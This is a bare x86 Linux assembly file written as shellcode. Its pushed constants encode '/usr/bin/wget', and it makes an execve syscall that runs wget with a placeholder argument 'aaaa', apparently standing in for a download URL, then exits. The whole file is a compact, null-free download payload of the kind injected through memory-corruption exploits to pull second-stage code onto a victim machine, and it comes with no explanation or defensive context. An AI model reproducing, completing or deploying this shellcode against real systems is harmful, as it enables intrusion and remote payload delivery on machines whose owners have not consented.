global _start

section .text
_start:
  push   0xb
  pop    eax
  cdq

  push   edx
  push   0x61616161
  mov    ecx,esp
  push   edx

  push   0x74
  push   0x6567772f
  push   0x6e69622f
  push   0x7273752f
  mov    ebx,esp
  
  push   edx
  push   ecx
  push   ebx
  mov    ecx,esp
  int    0x80

  inc    eax
  int    0x80
